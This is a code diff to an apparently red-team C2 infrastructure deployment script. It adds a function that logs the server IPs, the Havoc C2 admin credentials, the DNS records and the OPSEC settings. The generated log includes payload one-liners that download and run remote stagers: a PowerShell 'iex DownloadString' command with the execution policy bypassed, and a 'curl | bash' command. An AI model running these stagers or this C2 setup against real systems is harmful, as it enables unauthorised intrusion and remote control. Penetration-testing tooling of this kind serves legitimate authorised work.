@@ -1187,6 +1187,164 @@ def deploy_tracker(config):
         
         return False
 
+def generate_deployment_info(config, success=True):
+    """Generate a comprehensive deployment information log file"""
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    deployment_name = f"{config.get('provider', 'unknown')}-{timestamp}"
+    log_file = os.path.join("logs", f"deployment_info_{deployment_name}.log")
+    
+    # Ensure log directory exists
+    os.makedirs("logs", exist_ok=True)
+    
+    # Start collecting information
+    info = []
+    info.append("=" * 80)
+    info.append(f"C2ingRed Deployment Information - {deployment_name}")
+    info.append("=" * 80)
+    info.append("")
+    
+    # Basic deployment info
+    info.append("DEPLOYMENT OVERVIEW")
+    info.append("-----------------")
+    info.append(f"Deployment Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    info.append(f"Provider: {config.get('provider', 'N/A')}")
+    info.append(f"Deployment Status: {'SUCCESS' if success else 'FAILED'}")
+    info.append(f"Domain: {config.get('domain', 'N/A')}")
+    
+    # Deployment type
+    deployment_type = "Full Deployment"
+    if config.get('redirector_only'):
+        deployment_type = "Redirector Only"
+    elif config.get('c2_only'):
+        deployment_type = "C2 Server Only"
+    elif config.get('deploy_tracker') and not config.get('integrated_tracker'):
+        deployment_type = "Standalone Tracker"
+    elif config.get('deploy_tracker') and config.get('integrated_tracker'):
+        deployment_type = "Full Deployment with Integrated Tracker"
+    info.append(f"Deployment Type: {deployment_type}")
+    info.append("")
+    
+    # Server Information
+    info.append("SERVER INFORMATION")
+    info.append("-----------------")
+    if not config.get('c2_only'):
+        info.append("Redirector:")
+        info.append(f"  Name: {config.get('redirector_name', 'N/A')}")
+        info.append(f"  IP: {config.get('redirector_ip', 'N/A')}")
+        info.append(f"  Domain: {config.get('redirector_subdomain', 'cdn')}.{config.get('domain', 'N/A')}")
+    
+    if not config.get('redirector_only'):
+        info.append("C2 Server:")
+        info.append(f"  Name: {config.get('c2_name', 'N/A')}")
+        info.append(f"  IP: {config.get('c2_ip', 'N/A')}")
+        info.append(f"  Domain: {config.get('c2_subdomain', 'mail')}.{config.get('domain', 'N/A')}")
+    
+    if config.get('deploy_tracker') and not config.get('integrated_tracker'):
+        info.append("Tracker Server:")
+        info.append(f"  Name: {config.get('tracker_name', 'N/A')}")
+        info.append(f"  IP: {config.get('tracker_ip', 'N/A')}")
+        info.append(f"  Domain: {config.get('tracker_domain', 'track.' + config.get('domain', 'N/A'))}")
+    
+    info.append("")
+    
+    # SSH Information
+    info.append("SSH INFORMATION")
+    info.append("--------------")
+    info.append(f"SSH Key: {config.get('ssh_key', 'N/A')}")
+    info.append(f"SSH User: {config.get('ssh_user', 'N/A')}")
+    if config.get('ssh_port'):
+        info.append(f"SSH Port: {config.get('ssh_port')}")
+    info.append("")
+    
+    # Port Information
+    info.append("PORT INFORMATION")
+    info.append("---------------")
+    info.append(f"HTTP Port: {config.get('havoc_http_port', 8080)}")
+    info.append(f"HTTPS Port: {config.get('havoc_https_port', 443)}")
+    info.append(f"Teamserver Port: {config.get('havoc_teamserver_port', 40056)}")
+    info.append(f"Shell Handler Port: {config.get('shell_handler_port', 4444)}")
+    info.append(f"GoPhish Admin Port: {config.get('gophish_admin_port', 'N/A')}")
+    info.append("")
+    
+    # Havoc C2 Credentials
+    info.append("HAVOC C2 CREDENTIALS")
+    info.append("------------------")
+    info.append(f"Admin User: {config.get('havoc_admin_user', 'admin')}")
+    if 'havoc_admin_password' in config:
+        info.append(f"Admin Password: {config.get('havoc_admin_password')}")
+    else:
+        info.append("Admin Password: Check /root/Tools/havoc/data/profiles/default.yaotl on C2 server")
+    info.append("")
+    
+    # DNS Configuration
+    info.append("DNS CONFIGURATION")
+    info.append("----------------")
+    info.append("Required DNS Records:")
+    if not config.get('c2_only'):
+        info.append(f"  {config.get('redirector_subdomain', 'cdn')}.{config.get('domain', 'example.com')} -> {config.get('redirector_ip', 'N/A')} (A Record)")
+    
+    if not config.get('redirector_only'):
+        info.append(f"  {config.get('c2_subdomain', 'mail')}.{config.get('domain', 'example.com')} -> {config.get('c2_ip', 'N/A')} (A Record)")
+        info.append(f"  {config.get('domain', 'example.com')} -> {config.get('c2_ip', 'N/A')} (A Record)")
+    
+    if config.get('deploy_tracker') and not config.get('integrated_tracker'):
+        info.append(f"  {config.get('tracker_domain', 'track.' + config.get('domain', 'example.com'))} -> {config.get('tracker_ip', 'N/A')} (A Record)")
+    elif config.get('deploy_tracker') and config.get('integrated_tracker'):
+        info.append(f"  {config.get('tracker_domain', 'track.' + config.get('domain', 'example.com'))} -> {config.get('c2_ip', 'N/A')} (A Record)")
+    
+    info.append("")
+    
+    # OPSEC Settings
+    info.append("OPSEC SETTINGS")
+    info.append("-------------")
+    info.append(f"Zero Logs: {'Enabled' if config.get('zero_logs') else 'Disabled'}")
+    info.append(f"Secure Memory: {'Enabled' if config.get('secure_memory') else 'Disabled'}")
+    info.append(f"Command History: {'Disabled' if config.get('disable_history') else 'Enabled'}")
+    info.append(f"Randomized Ports: {'Enabled' if config.get('randomize_ports') else 'Disabled'}")
+    info.append("")
+    
+    # Connection Commands
+    info.append("CONNECTION COMMANDS")
+    info.append("-----------------")
+    
+    if not config.get('redirector_only'):
+        c2_ip = config.get('c2_ip', 'YOUR_C2_IP')
+        teamserver_port = config.get('havoc_teamserver_port', '40056')
+        info.append(f"Havoc Teamserver: ./havoc client --address {c2_ip}:{teamserver_port} --username admin --password [password]")
+    
+    if not config.get('c2_only'):
+        redirector_domain = f"{config.get('redirector_subdomain', 'cdn')}.{config.get('domain', 'example.com')}"
+        info.append(f"PowerShell Payload: powershell -exec bypass -c \"iex(New-Object Net.WebClient).DownloadString('https://{redirector_domain}/windows_stager.ps1')\"")
+        info.append(f"Linux Payload: curl -s https://{redirector_domain}/linux_stager.sh | bash")
+    
+    info.append("")
+    
+    # Post-Deployment Instructions
+    info.append("POST-DEPLOYMENT INSTRUCTIONS")
+    info.append("--------------------------")
+    info.append("1. Configure DNS records as listed above")
+    info.append("2. Run the post-install script on your C2 server:")
+    info.append("   /root/Tools/post_install_c2.sh")
+    if not config.get('c2_only'):
+        info.append("3. Run the post-install script on your redirector:")
+        info.append("   /root/Tools/post_install_redirector.sh")
+    
+    info.append("")
+    info.append("CLEANUP COMMAND")
+    info.append("---------------")
+    info.append(f"./deploy.py --provider {config.get('provider', 'PROVIDER')} --teardown")
+    if config.get('provider') == 'linode':
+        info.append(f"Additional parameters: --linode-token YOUR_TOKEN")
+    elif config.get('provider') == 'aws':
+        info.append(f"Additional parameters: --aws-key YOUR_KEY --aws-secret YOUR_SECRET")
+    
+    # Write to file
+    with open(log_file, 'w') as f:
+        f.write('\n'.join(info))
+    
+    logging.info(f"Deployment information saved to {log_file}")
+    return log_file
+
 def main():
     """Main function to run the deployment"""
     # Display banner
@@ -1373,9 +1531,13 @@ C2itAll - Red Team Infrastructure Setup
             success = deploy_infrastructure(config)
             if not success:
                 logging.error("Deployment failed!")
+                deployment_info_log = generate_deployment_info(config, success=False)
+                print(f"\nDeployment information saved to: {deployment_info_log}")
                 cleanup_resources(config, interactive=True)
                 return
             logging.info("Deployment completed successfully!")
+            deployment_info_log = generate_deployment_info(config, success=True)
+            print(f"\nDeployment information saved to: {deployment_info_log}")
             
             # SSH into instance if requested
             if config.get('ssh_after_deploy'):
@@ -1386,9 +1548,13 @@ C2itAll - Red Team Infrastructure Setup
             success = deploy_tracker(config)
             if not success:
                 logging.error("Tracker deployment failed!")
+                deployment_info_log = generate_deployment_info(config, success=False)
+                print(f"\nDeployment information saved to: {deployment_info_log}")
                 cleanup_resources(config, interactive=True)
                 return
             logging.info("Tracker deployment completed successfully!")
+            deployment_info_log = generate_deployment_info(config, success=True)
+            print(f"\nDeployment information saved to: {deployment_info_log}")
             
             # SSH into tracker if requested
             if config.get('ssh_after_deploy'):
@@ -1397,6 +1563,8 @@ C2itAll - Red Team Infrastructure Setup
     except KeyboardInterrupt:
         print("\n\nDeployment interrupted by user")
         logging.info("Deployment interrupted by user")
+        deployment_info_log = generate_deployment_info(config, success=False)
+        print(f"\nDeployment information saved to: {deployment_info_log}")
         try:
             cleanup_resources(config, interactive=True)
         except KeyboardInterrupt:
@@ -1404,6 +1572,8 @@ C2itAll - Red Team Infrastructure Setup
             logging.warning("Cleanup interrupted by user. Resources may still exist.")
     except Exception as e:
         logging.error(f"Deployment failed with error: {e}")
+        deployment_info_log = generate_deployment_info(config, success=False)
+        print(f"\nDeployment information saved to: {deployment_info_log}")
         if config.get('debug'):
             import traceback
             traceback.print_exc()
@@ -1413,6 +1583,7 @@ C2itAll - Red Team Infrastructure Setup
         except KeyboardInterrupt:
             print("\nCleanup interrupted. Resources may still exist.")
             logging.warning("Cleanup interrupted by user. Resources may still exist.")
+
 
 if __name__ == "__main__":
     main()
